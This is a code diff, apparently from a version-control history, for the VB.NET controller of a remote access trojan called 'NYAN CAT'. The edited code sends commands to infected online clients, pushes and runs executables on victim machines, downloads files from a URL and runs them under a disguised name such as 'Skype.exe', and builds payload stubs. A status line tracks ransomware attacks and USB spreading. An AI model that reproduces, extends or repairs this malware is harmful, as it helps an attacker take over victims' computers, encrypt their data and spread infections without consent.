@@ -1,5 +1,5 @@
 ﻿'##################################################################
-'##        N Y A N   C A T  |||   Updated on Nov./27/2018        ##
+'##        N Y A N   C A T  |||   Updated on JAN./16/2019        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -256,9 +256,9 @@ Public Class Main
         Await M.WriteAsync(CMD, 0, CMD.Length)
         Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
         Try
-            For Each x As ListViewItem In L1.Items
-                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                    Dim CL As S_Client = CType(x.Tag, S_Client)
+            For Each x In S_Settings.Online.ToList
+                Dim CL As S_Client = CType(x, S_Client)
+                If Not x.L.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                     CL.Send(M.ToArray)
                 End If
             Next
@@ -433,7 +433,7 @@ Public Class Main
 
     Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles LabelUpdate.Tick
         Try
-            MetroLabel1.Text = "ONLINE CLIENTS [" & L1.Items.Count & "]        SELECTED CLIENTS [" & L1.SelectedItems.Count & "]        TOTAL RANSOMWARE ATTACKS [" & KeyCount() & "]        TOTAL USB SPREAD [" & SpreadCount() & "]"
+            MetroLabel1.Text = "ONLINE CLIENTS [" & S_Settings.Online.Count & "]        SELECTED CLIENTS [" & L1.SelectedItems.Count & "]        TOTAL RANSOMWARE ATTACKS [" & KeyCount() & "]        TOTAL USB SPREAD [" & SpreadCount() & "]"
         Catch ex As Exception
         End Try
     End Sub
@@ -987,10 +987,10 @@ Public Class Main
         Try
             If L1.Items.Count > 0 Then
                 Dim o As New OpenFileDialog
-            With o
-                .Filter = ".exe (*.exe)|*.exe"
-                .Title = "UPDATE"
-            End With
+                With o
+                    .Filter = ".exe (*.exe)|*.exe"
+                    .Title = "UPDATE"
+                End With
 
                 If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                     Dim PLG = Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
@@ -1218,9 +1218,9 @@ Public Class Main
         Try
             If L1.Items.Count > 0 Then
                 Dim o As New OpenFileDialog
-            With o
-                .Title = "RUN"
-            End With
+                With o
+                    .Title = "RUN"
+                End With
 
                 If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                     Dim PLG = Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
@@ -1255,7 +1255,7 @@ Public Class Main
         Try
             If L1.Items.Count > 0 Then
                 Dim URL As String = InputBox("Enter the direct link", "Run File", "http: //site.com/file.exe")
-            Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")
+                Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")
 
                 If String.IsNullOrEmpty(URL) Then
                     Exit Sub
@@ -1448,9 +1448,9 @@ Public Class Main
                 Await M.WriteAsync(CMD, 0, CMD.Length)
                 Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
 
-                For Each x As ListViewItem In L1.Items
-                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
+                For Each x In S_Settings.Online.ToList
+                    Dim CL As S_Client = CType(x, S_Client)
+                    If Not CL.L.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                         CL.Send(M.ToArray)
                     End If
                 Next
@@ -1467,6 +1467,7 @@ Public Class Main
 #End Region
 
 #End Region
+
 
 
 #Region "Builder"
@@ -1653,8 +1654,8 @@ Public Class Main
 
                     definition.Dispose()
                     Try : IO.File.Delete(Application.StartupPath & "\Misc\Stub\Stub.exe") : Catch : End Try
-                    End If
                 End If
+            End If
         Catch ex1 As Exception
             MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
             Return
